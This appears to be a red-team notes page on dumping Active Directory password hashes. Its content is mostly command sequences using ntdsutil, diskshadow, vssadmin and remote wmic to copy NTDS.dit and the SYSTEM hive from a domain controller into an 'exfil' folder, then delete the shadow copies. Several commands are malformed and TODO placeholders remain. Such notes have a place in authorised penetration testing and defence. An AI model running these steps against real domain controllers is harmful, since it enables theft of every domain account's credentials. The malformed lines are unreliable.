# Living off the Land

## 01 - Command Prompt

TODO: Fill this info

The file can be found in the following Windows location:

`C:\Windows\NTDS\NTDS.dit`

### Install From Media (IFM)

```
C:\> ntdsutil.exe "activate instance ntds" "ifm" "create full c:\temp" quit quit

C:\> ntdsutil.exe "ac in ntds" "ifm" "cr fu c:\temp" q q

C:\> dir c:\temp
```

### DiskShadow

^c70a55

- Write down the diskshadow commands in a text file to automate the process.

```
C:\> mkdir C:\exfil

C:\> type C:\diskshadow.txt
set context persistent nowriters
add volume c: alias ShadowVolume
create
expose %ShadowVolume% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %ShadowVolume%
reset
```

- Then extract shadow file and SYSTEM from registry. Once two files are present go to [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Credential Access and Dumping/Windows/Active Directory/Volume Shadow Copy/Manual/Impacket|section to use impacket to extract credentials via hashdump]].

```
C:\> diskshadow.exe /s c:\diskshadow.txt
C:\> reg save hklm\system c:\exfil\system.bak
C:\> dir c:\exfil
```

### VSSAdmin.exe

```
C:\> vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\extract.dit

C:\> vssadmin create shadow /for=C: 2>&1

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<n>\Windows\NTDS\NTDS.dit C:\ShadowCopy 2>&1

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<n>\Windows\System32\config\SYSTEM C:\ShadowCopy 2>&1

C:\> dir C:\ShadowCopy\

C:\> vssadmin delete shadows /for=C:
```

- Can be performed laterally via `wmic.exe`.

TODO: Perform kerberos ticket via WMIC

```
C:\> wmic /node:<domain_controller_IP> [/user:<DOMAIN>\<username>] [/password:<password>] process call create "cmd.exe /c vssadmin create shadow /for=C: 2>&1"

C:\> wmic /node:<domain_controller_IP> [/user:<DOMAIN>\<username>] [/password:<password>] process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<n>\Windows\NTDS\NTDS.dit C:\ShadowCopy & \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<n>\Windows\System32\config\SYSTEM C:\ShadowCopy 2>&1"

C:\> dir \\<domain_controller_IP>\C$\ShadowCopy\

C:\> copy \\<domain_controller_IP>\C$\ShadowCopy\NTDS.dit c:\Windows\Temp\NTDS.dit

C:\> copy \\<domain_controller_IP>\C$\ShadowCopy\SYSTEM c:\Windows\Temp\SYSTEM

C:\> wmic /node:<domain_controller_IP> [/user:<DOMAIN>\<username>] [/password:<password>] process call create "cmd /cvssadmin delete shadows /for=C: 2>&1"
```

---
## References

- [Pentestlab Blog](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)

- [Active Directory Security: How Attackers Dump Active Directory Database Credentials](https://adsecurity.org/?p=2398)

- [Red Team Notes: Dumping Domain Controller Hashes Locally and Remotely](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)

- [Dumping Domain Controller Hashes via wmic and Vssadmin Shadow Copy](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin)

- [DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)

- [Password Auditing: How to Extract and Analyse Domain User Passwords](https://www.surecloud.com/resources/blog/extract-analyse-domain-user-passwords)

- [Ultimate IT Security: Creating a shadow copy of ntds.dit and the SYSTEM file](https://www.ultimatewindowssecurity.com/blog/default.aspx?p=bbcddadf-677f-4f60-9d55-914f631c3d1a)

- [Netwrix: Extracting Password Hashes from the Ntds.dit File](https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/)